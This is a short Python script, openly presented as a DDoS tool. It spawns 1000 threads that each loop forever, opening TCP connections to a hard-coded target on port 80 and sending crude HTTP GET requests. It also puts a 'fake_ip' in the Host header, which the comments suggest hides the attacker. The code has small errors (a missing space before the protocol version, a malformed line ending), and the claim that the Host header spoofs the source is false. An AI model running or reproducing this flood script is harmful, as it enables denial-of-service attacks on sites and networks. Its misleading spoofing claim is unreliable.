import socket
import threading

target = '192.168.70.234' # could be the ip address of your router or domain name of a wabsite
port = 80 # The port matters in the DDOS, 80 is used in http attack
fake_ip = '182.21.20.32' # Stays as the header of the attack

def attack():
    # Endless loop opening socket connection
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host: " + fake_ip + "r\n\r\n").encode('ascii'), (target,port))
        s.close()

for i in range(1000):
    #creates multiple threading
    thread = threading.Thread(target=attack) # Target functions
    thread.start()